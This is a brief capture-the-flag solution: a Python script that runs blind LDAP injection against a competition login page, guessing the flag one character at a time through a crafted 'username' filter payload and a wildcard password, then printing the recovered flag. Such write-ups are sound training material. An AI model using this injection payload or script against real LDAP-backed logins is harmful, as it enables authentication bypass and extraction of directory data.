# Solution
```
import requests
import string

url = "https://lightweight.chal.bts.wh.edu.pl"
charset = string.ascii_letters + string.digits + "{}_-"
known_prefix = "BtSCTF{"  

flag = known_prefix
session = requests.Session()

print("[*] Starting blind LDAP injection...")

while True:
    found = False
    for c in charset:
        attempt = flag + c
        payload = {
            'username': f'*)(description={attempt}*',
            'password': '*'
        }

        response = session.post(url, data=payload)

        if response.status_code == 200 and "Invalid credentials" not in response.text:
            flag = attempt
            print(f"[+] Found char: {c} → {flag}")
            found = True
            break

    if not found:
        print("[-] No further characters found.")
        break

    if flag.endswith("}"):
        print(f"Final Flag: {flag}")
        break

```

Flag:`BtSCTF{_bl1nd_ld4p_1nj3ct10n_y1pp333333}`


Solved by: 0xad3n